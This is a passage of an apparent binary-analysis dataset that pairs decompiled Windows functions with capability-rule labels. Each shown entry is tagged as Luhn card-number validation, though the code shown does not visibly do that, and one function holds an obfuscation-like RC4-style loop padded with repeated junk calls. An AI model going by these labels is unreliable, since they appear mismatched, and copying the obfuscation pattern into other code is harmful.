        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n\nvoid fcn.00401120(uint param_1)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_8h_2;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    uint var_8h;\n    uint32_t var_34h;\n    uint var_24h;\n    uchar var_1dh;\n    uint32_t var_1ch_2;\n    uint *var_18h_2;\n    int32_t var_10h_2;\n    uint uStack16;\n    uint32_t uStack12;\n    uint var_4h;\n    \n    uStack16 = 0x462bd0;\n    var_10h_2 = *in_FS_OFFSET;\n    uStack12 = *0x4b8030 ^ 0x4b1020;\n    var_34h = *0x4b8030 ^ &stack0xfffffffc;\n    var_18h_2 = &var_34h;\n    *in_FS_OFFSET = &var_10h_2;\n    var_4h = 0;\n    var_24h = 0;\n    var_1ch_2 = var_34h;\n    iVar1 = fcn.004022f0(&var_24h, var_8h_2, 0x2000);\n    if (iVar1 < 0) {\n        var_1dh = 0;\n    }\n    else {\n        fcn.00462d70();\n        var_18h_2 = &var_34h;\n    }\n    var_4h = 0xfffffffe;\n    *in_FS_OFFSET = var_10h_2;\n    fcn.0045e747(var_24h);\n    return;\n}\n",
        "token_count": 405
    },
    "004012c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004012c0(uint param_1, uint param_2, uint param_3)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0045ef32(param_1, param_2, param_3);\n    fcn.00401000(uVar1);\n    return;\n}\n",
        "token_count": 71
    },
    "00402070": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.00402070(uint *param_1, int32_t param_2)\n\n{\n    uint *puVar1;\n    \n    if (-param_2 - 1U < 8) {\n        puVar1 = fcn.00401280(0x80070057);\n    }\n    else {\n        puVar1 = fcn.0045ea05(param_2 + 8);\n        if (puVar1 == NULL) {\n            return NULL;\n        }\n    }\n    *puVar1 = *param_1;\n    *param_1 = puVar1;\n    return puVar1 + 2;\n}\n",
        "token_count": 140
    },
    "004021e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004021e0(uint *param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    bool bVar3;\n    uint uVar4;\n    uint uVar5;\n    \n    if (param_2 == 0) {\n        *param_1 = 0;\n        return;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_2);\n    iVar1 = iVar1 + 1;\n    fcn.00402380(param_1, iVar1 * 4, param_1 + 1, 0x80);\n    uVar5 = 0;\n    iVar2 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(param_2, 0, param_2, iVar1, *param_1, iVar1 * 4, 0, 0);\n    bVar3 = iVar2 == 0;\n    if (bVar3) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar2 == 0x7a) {\n            uVar4 = 0;\n            uVar5 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(uVar5, 0, param_2, iVar1, 0, 0, 0, 0);\n            fcn.00402380(param_1, uVar5, param_1 + 1, 0x80);\n            iVar1 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(uVar4, 0, param_2, iVar1, *param_1, uVar5, 0, 0);\n            bVar3 = iVar1 == 0;\n        }\n        if (bVar3) {\n            fcn.004012a0();\n        }\n    }\n    return;\n}\n",
        "token_count": 415
    },
    "004022c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004022c0(int32_t *param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0045ea05(param_2);\n    if (iVar1 == 0) {\n        iVar1 = fcn.00401280(0x8007000e);\n    }\n    *param_1 = iVar1;\n    return;\n}\n",
        "token_count": 92
    },
    "004022f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.004022f0(int32_t *param_1, int32_t param_2, uint32_t param_3)\n\n{\n    if (-param_2 - 1U < param_3) {\n        return 0x80070057;\n    }\n    *param_1 = param_2 + param_3;\n    return 0;\n}\n",
        "token_count": 79
    },
    "00402510": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402510(code **param_1)\n\n{\n    uint32_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack12;\n    uint uStack8;\n    uint32_t uStack4;\n    \n    uStack8 = 0x48eff6;\n    piStack12 = *in_FS_OFFSET;\n    uVar1 = *0x4b8030 ^ &stack0xffffffec;\n    *in_FS_OFFSET = &piStack12;\n    *param_1 = vtable.CMainFrame.0;\n    uStack4 = 1;\n    fcn.0041d995(uVar1);\n    uStack4 = uStack4 & 0xffffff00;\n    fcn.0041d3b6();\n    uStack4 = 0xffffffff;\n    fcn.004221c9();\n    *in_FS_OFFSET = piStack12;\n    return;\n}\n",
        "token_count": 200
    },
    "00402670": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00402670(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint16_t *puVar2;\n    uint16_t *puVar3;\n    uint32_t unaff_EDI;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadResource)(param_1, param_2);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    puVar2 = (*_sym.imp.KERNEL32.dll_LockResource)(iVar1);\n    if (puVar2 != NULL) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_SizeofResource)(param_1, param_2);\n        puVar3 = iVar1 + puVar2;\n        for (unaff_EDI = unaff_EDI & 0xf; unaff_EDI != 0; unaff_EDI = unaff_EDI - 1) {\n            if (puVar3 <= puVar2) {\n                return 0;\n            }\n            puVar2 = puVar2 + *puVar2 + 1;\n        }\n        if (puVar2 < puVar3) {\n            return -(*puVar2 != 0) & puVar2;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 277
    },
    "004026e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004026e0(uint param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_FindResourceA)(param_1, (param_2 >> 4) + 1 & 0xffff, 6);\n    if (iVar1 == 0) {\n        return;\n    }\n    fcn.00402670(param_1, iVar1, param_2);\n    return;\n}\n",
        "token_count": 106
    },
    "004028e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004028e0(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    \n    uVar2 = 0;\n    cVar1 = *param_2;\n    while (cVar1 != '\\0') {\n        iVar3 = cVar1;\n        if ('`' < cVar1) {\n            iVar3 = iVar3 + -0x20;\n        }\n        param_2 = param_2 + 1;\n        uVar2 = (uVar2 >> 0xd | uVar2 << 0x13) + iVar3;\n        cVar1 = *param_2;\n    }\n    return uVar2;\n}\n",
        "token_count": 167
    },
    "00402910": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00402910(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    int32_t **in_FS_OFFSET;\n    bool bVar10;\n    int32_t in_stack_00000024;\n    int32_t in_stack_fffff194;\n    uint32_t uStack3684;\n    uint32_t uStack2368;\n    int32_t iStack2188;\n    int32_t iStack2184;\n    int32_t **ppiStack2180;\n    int32_t iStack2176;\n    uint uStack2172;\n    int32_t **ppiStack2168;\n    int32_t iStack2164;\n    int32_t iStack2160;\n    int32_t **ppiStack2156;\n    int32_t iStack2152;\n    uint uStack2148;\n    int32_t **ppiStack2144;\n    int32_t iStack2140;\n    uint uStack2136;\n    int32_t **ppiStack2132;\n    int32_t iStack2128;\n    uint uStack2124;\n    int32_t **ppiStack2120;\n    int32_t iStack2116;\n    int32_t iStack2112;\n    int32_t **ppiStack2108;\n    int32_t iStack2104;\n    uint uStack2100;\n    int32_t **ppiStack2096;\n    int32_t iStack2092;\n    uint uStack2088;\n    int32_t **ppiStack2084;\n    int32_t iStack2080;\n    uint uStack2076;\n    int32_t **ppiStack2072;\n    int32_t iStack2068;\n    int32_t iStack2064;\n    int32_t **ppiStack2060;\n    int32_t iStack2056;\n    uint uStack2052;\n    int32_t **ppiStack2048;\n    int32_t iStack2044;\n    uint uStack2040;\n    int32_t **ppiStack2036;\n    int32_t iStack2032;\n    uint uStack2028;\n    int32_t **ppiStack2024;\n    int32_t iStack2020;\n    int32_t iStack2016;\n    int32_t **ppiStack2012;\n    int32_t iStack2008;\n    uint uStack2004;\n    int32_t **ppiStack2000;\n    int32_t iStack1996;\n    uint uStack1992;\n    int32_t **ppiStack1988;\n    int32_t iStack1984;\n    uint uStack1980;\n    int32_t **ppiStack1976;\n    int32_t iStack1972;\n    int32_t iStack1968;\n    int32_t **ppiStack1964;\n    int32_t iStack1960;\n    uint uStack1956;\n    int32_t **ppiStack1952;\n    int32_t iStack1948;\n    uint uStack1944;\n    int32_t **ppiStack1940;\n    int32_t iStack1936;\n    uint uStack1932;\n    int32_t **ppiStack1928;\n    int32_t iStack1924;\n    int32_t iStack1920;\n    int32_t **ppiStack1916;\n    int32_t iStack1912;\n    uint uStack1908;\n    int32_t **ppiStack1904;\n    int32_t iStack1900;\n    uint uStack1896;\n    int32_t **ppiStack1892;\n    int32_t iStack1888;\n    uint uStack1884;\n    int32_t **ppiStack1880;\n    int32_t iStack1876;\n    int32_t iStack1872;\n    int32_t **ppiStack1868;\n    int32_t iStack1864;\n    uint uStack1860;\n    int32_t **ppiStack1856;\n    int32_t iStack1852;\n    uint uStack1848;\n    int32_t **ppiStack1844;\n    int32_t iStack1840;\n    uint uStack1836;\n    int32_t **ppiStack1832;\n    int32_t iStack1828;\n    int32_t iStack1824;\n    int32_t **ppiStack1820;\n    int32_t iStack1816;\n    uint uStack1812;\n    int32_t **ppiStack1808;\n    int32_t iStack1804;\n    uint uStack1800;\n    int32_t **ppiStack1796;\n    int32_t iStack1792;\n    int32_t iStack1788;\n    int32_t **ppiStack1784;\n    int32_t iStack1780;\n    int32_t iStack1776;\n    int32_t **ppiStack1772;\n    int32_t iStack1768;\n    int32_t iStack1764;\n    int32_t **ppiStack1760;\n    int32_t iStack1756;\n    uint uStack1752;\n    int32_t **ppiStack1748;\n    int32_t iStack1744;\n    int32_t iStack1740;\n    int32_t **ppiStack1736;\n    int32_t iStack1732;\n    int32_t iStack1728;\n    int32_t **ppiStack1724;\n    int32_t iStack1720;\n    int32_t iStack1716;\n    int32_t **ppiStack1712;\n    int32_t iStack1708;\n    uint uStack1704;\n    int32_t **ppiStack1700;\n    int32_t iStack1696;\n    int32_t iStack1692;\n    int32_t **ppiStack1688;\n    int32_t iStack1684;\n    int32_t iStack1680;\n    int32_t **ppiStack1676;\n    int32_t iStack1672;\n    int32_t iStack1668;\n    int32_t **ppiStack1664;\n    int32_t iStack1660;\n    uint uStack1656;\n    int32_t **ppiStack1652;\n    int32_t iStack1648;\n    int32_t iStack1644;\n    int32_t **ppiStack1640;\n    int32_t iStack1636;\n    int32_t iStack1632;\n    int32_t **ppiStack1628;\n    int32_t iStack1624;\n    uint uStack1620;\n    int32_t **ppiStack1616;\n    int32_t iStack1612;\n    uint uStack1608;\n    int32_t **ppiStack1604;\n    int32_t iStack1600;\n    int32_t iStack1596;\n    int32_t **ppiStack1592;\n    int32_t iStack1588;\n    int32_t iStack1584;\n    int32_t **ppiStack1580;\n    int32_t iStack1576;\n    int32_t iStack1572;\n    int32_t **ppiStack1568;\n    int32_t iStack1564;\n    uint uStack1560;\n    int32_t **ppiStack1556;\n    int32_t iStack1552;\n    int32_t iStack1548;\n    int32_t **ppiStack1544;\n    int32_t iStack1540;\n    int32_t iStack1536;\n    int32_t **ppiStack1532;\n    int32_t iStack1528;\n    int32_t iStack1524;\n    int32_t **ppiStack1520;\n    int32_t iStack1516;\n    uint uStack1512;\n    int32_t **ppiStack1508;\n    int32_t iStack1504;\n    int32_t iStack1500;\n    int32_t **ppiStack1496;\n    int32_t iStack1492;\n    int32_t iStack1488;\n    int32_t **ppiStack1484;\n    int32_t iStack1480;\n    int32_t iStack1476;\n    int32_t **ppiStack1472;\n    int32_t iStack1468;\n    uint uStack1464;\n    int32_t iStack1456;\n    int32_t iStack1452;\n    int32_t iStack1448;\n    int32_t iStack1444;\n    int32_t iStack1436;\n    int32_t iStack1428;\n    int32_t iStack1404;\n    int32_t iStack1380;\n    int32_t iStack1372;\n    int32_t iStack1364;\n    int32_t iStack1356;\n    int32_t iStack1324;\n    int32_t iStack1316;\n    int32_t iStack1300;\n    int32_t iStack1284;\n    int32_t iStack1260;\n    int32_t iStack1244;\n    int32_t iStack1212;\n    int32_t iStack1204;\n    int32_t iStack1164;\n    int32_t iStack1124;\n    int32_t iStack1084;\n    int32_t iStack1044;\n    int32_t iStack1036;\n    int32_t iStack1020;\n    int32_t iStack1004;\n    int32_t iStack964;\n    int32_t iStack948;\n    int32_t iStack924;\n    int32_t iStack884;\n    int32_t iStack860;\n    int32_t iStack852;\n    int32_t iStack844;\n    int32_t iStack836;\n    int32_t iStack804;\n    int32_t iStack772;\n    int32_t iStack764;\n    int32_t iStack724;\n    int32_t iStack684;\n    int32_t iStack652;\n    int32_t iStack604;\n    int32_t iStack596;\n    int32_t iStack508;\n    int32_t iStack476;\n    int32_t iStack468;\n    int32_t iStack420;\n    int32_t iStack332;\n    int32_t iStack284;\n    int32_t iStack244;\n    int32_t iStack100;\n    uint32_t uStack16;\n    int32_t *piStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x490b41;\n    piStack12 = *in_FS_OFFSET;\n    uStack16 = *0x4b8030 ^ &stack0xfffff194;\n    *in_FS_OFFSET = &piStack12;\n    uVar4 = 0;\n    if (param_3 != 0) {\n        do {\n            *(&ppiStack2180 + uVar4) = uVar4;\n            uVar4 = uVar4 + 1;\n        } while (uVar4 < 0x873);\n        uVar9 = 0;\n        uVar4 = 0;\n        do {\n            uVar2 = *(&ppiStack2180 + uVar4);\n            uVar8 = uVar4 + 1;\n            uVar9 = (uVar2 + *(uVar4 % 0x22 + param_1) + uVar9) % 0x873;\n            *(&ppiStack2180 + uVar4) = *(&ppiStack2180 + uVar9);\n            *(&ppiStack2180 + uVar9) = uVar2;\n            uVar4 = uVar8;\n        } while (uVar8 < 0x873);\n        iStack2188 = 0;\n        uStack2368 = 0;\n        uStack3684 = 0;\n        do {\n            uStack3684 = (uStack3684 + 1) % 0x873;\n            param_3 = param_3 + -1;\n            uVar2 = *(&ppiStack2180 + uStack3684);\n            uStack2368 = (uVar2 + uStack2368) % 0x873;\n            *(&ppiStack2180 + uStack3684) = *(&ppiStack2180 + uStack2368);\n            *(&ppiStack2180 + uStack2368) = uVar2;\n            iVar5 = (*_sym.imp.USER32.dll_GetSystemMenu)(0, 0);\n            if (iVar5 != 0) {\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) {\ncode_r0x0040f1c8:\n                    fcn.00401280(0x80004005);\n                    pcVar3 = swi(3);\n                    (*pcVar3)();\n                    return;\n                }\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff194 + -0x10) + 4))(in_stack_fffff194 + -0x10, iVar5);\n                }\n                piVar6 = fcn.0042407a();\n                if (piVar6 == NULL) goto code_r0x0040f1c8;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x52e800;\n                iVar7 = fcn.00423f8f();\n                if (iVar7 != 0) {\n                    fcn.0040f770(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff194 + -4;\n                LOCK();\n                iVar7 